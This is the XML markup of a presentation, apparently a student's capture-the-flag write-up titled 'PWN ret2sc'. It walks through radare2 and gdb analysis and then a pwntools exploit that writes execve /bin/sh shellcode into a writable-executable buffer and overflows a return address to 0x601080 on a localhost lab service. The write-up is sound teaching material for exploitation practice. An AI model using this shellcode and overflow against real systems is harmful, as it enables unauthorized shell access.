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40000011FCAB111860C1A30C7.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000000B800000047E9D54FF723318CAA.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000002610000034302E1D38A2DB285D3.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/100000000000031B000001353935F78765D0E374.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000000C90000006EF4F8BB6D420C8C09.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000001FB00000178656DFA1FFE59029C.png" manifest:media-type="image/png"/>
  <manifest:file-entry manifest:full-path="Pictures/10000000000001470000003A15F0326A82FE15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431cm" fo:min-width="6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5.249cm" fo:min-width="6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1.819cm"/>
      <style:paragraph-properties style:writing-mode="lr-tb"/>
    </style:style>
    <style:style style:name="pr3" style:family="presentation" style:parent-style-name="預設-notes">
      <style:graphic-properties draw:fill-color="#ffffff" fo:min-height="12.572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301cm" svg:y="5.871cm" presentation:class="title" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>PWN ret2sc</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr2" draw:text-style-name="P1" draw:layer="layout" svg:width="25.199cm" svg:height="1.819cm" svg:x="1.301cm" svg:y="10cm" presentation:class="subtitle" presentation:user-transformed="true">
          <draw:text-box>
            <text:p>107062136文逸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行為分析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2.568cm" svg:height="4cm" svg:x="2.432cm" svg:y="4cm">
          <draw:image xlink:href="Pictures/10000000000001470000003A15F0326A82FE15BC.png" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad" draw:mime-type="image/png">
            <text:p/>
          </draw:image>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="10.5cm" svg:height="5.746cm" svg:x="2.5cm" svg:y="9cm">
          <draw:image xlink:href="Pictures/10000000000000C90000006EF4F8BB6D420C8C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逆向分析</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="10.6cm" svg:height="9.134cm" svg:x="1.4cm" svg:y="3.685cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L3">
              <text:list-item>
                <text:p>r2 ret2sc</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>aa</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>afl</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>只有main函式</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="14.085cm" svg:height="10.446cm" svg:x="12.514cm" svg:y="3.257cm">
          <draw:image xlink:href="Pictures/10000000000001FB00000178656DFA1FFE5902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逆向分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 main</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>VV</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>(底下就leave ret)</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="11.486cm" svg:height="15.749cm" svg:x="16cm" svg:y="0.001cm">
          <draw:image xlink:href="Pictures/10000000000002610000034302E1D38A2DB285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動態分析</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="25.199cm" svg:height="11.815cm" svg:x="1.4cm" svg:y="3.685cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L3">
              <text:list-item>
                <text:p>gdb ret2sc</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>b main</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>r</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>vmmap</text:p>
              </text:list-item>
              <text:list-item>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>0x00601000到0x00602000可讀寫執行</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="21.03cm" svg:height="8.173cm" svg:x="7cm" svg:y="4.827cm">
          <draw:image xlink:href="Pictures/100000000000031B000001353935F78765D0E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解題方法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沒有函式會取flag，所以要自己植入</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>name後的輸入會存在剛剛的記憶體區段中</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>植入shellcode後在第二個輸入BOF到ret address</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr2" draw:text-style-name="P2" draw:layer="layout" svg:width="6.481cm" svg:height="2.5cm" svg:x="21.019cm" svg:y="3.257cm">
          <draw:image xlink:href="Pictures/10000000000000B800000047E9D54FF723318C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解題方法</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame presentation:style-name="pr4" draw:layer="layout" svg:width="16.1cm" svg:height="9.134cm" svg:x="1.4cm" svg:y="3.685cm" presentation:class="outline" presentation:user-transformed="true">
          <draw:text-box>
            <text:list text:style-name="L3">
              <text:list-item>
                <text:p>Payload = 40 byte</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>Target = 0x601080</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>shellcode來源：</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>https://www.exploit-db.com/shellcodes/46907</text:p>
              </text:list-item>
            </text:list>
          </draw:text-box>
        </draw:frame>
        <draw:custom-shape draw:style-name="gr3" draw:text-style-name="P4" draw:layer="layout" svg:width="7cm" svg:height="1.681cm" svg:x="20.502cm" svg:y="13.819cm">
          <text:p text:style-name="P3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1.681cm" svg:x="20.502cm" svg:y="11.819cm">
          <text:p text:style-name="P3">Saved rb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5.499cm" svg:x="20.502cm" svg:y="5.819cm">
          <text:p text:style-name="P3">local_20h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0.962cm" svg:x="17.502cm" svg:y="5.357cm">
          <draw:text-box>
            <text:p>rbp-0x20</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr5" draw:text-style-name="P6" draw:layer="layout" svg:width="3cm" svg:height="0.962cm" svg:x="17.501cm" svg:y="11.318cm">
          <draw:text-box>
            <text:p>rbp</text:p>
          </draw:text-box>
        </draw:frame>
        <draw:frame draw:style-name="gr5" draw:text-style-name="P6" draw:layer="layout" svg:width="3cm" svg:height="0.962cm" svg:x="17.501cm" svg:y="13.318cm">
          <draw:text-box>
            <text:p>rbp+0x8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Exploit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om pwn import *</text:p>
              </text:list-item>
              <text:list-item>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>shellcode = "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"</text:p>
              </text:list-item>
              <text:list-item>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>#r = process("./ret2sc")</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>r = remote('localhost', 20000)</text:p>
              </text:list-item>
              <text:list-item>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>r.sendafter(':', shellcode)</text:p>
              </text:list-item>
              <text:list-item>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>sc_addr = 0x601080</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>r.recvuntil(':')</text:p>
              </text:list-item>
              <text:list-item>
                <text:p>r.sendline(b'a'*40 + p64(sc_addr))</text:p>
              </text:list-item>
              <text:list-item>
                <text:p/>
              </text:list-item>
              <text:list-item>
                <text:p>r.interactiv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遠端測試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087cm" svg:height="8.358cm" svg:x="2.5cm" svg:y="5cm">
          <draw:image xlink:href="Pictures/10000000000002D40000011FCAB111860C1A30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22:33:26.778735774</meta:creation-date>
    <dc:date>2021-10-25T23:13:59.141143930</dc:date>
    <meta:editing-duration>PT19M42S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:object-count="70"/>
    <meta:generator>LibreOffice/7.1.6.2.0$Linux_X86_64 LibreOffice_project/10$Build-2</meta:generator>
  </office:meta>
</office:document-meta>
</file>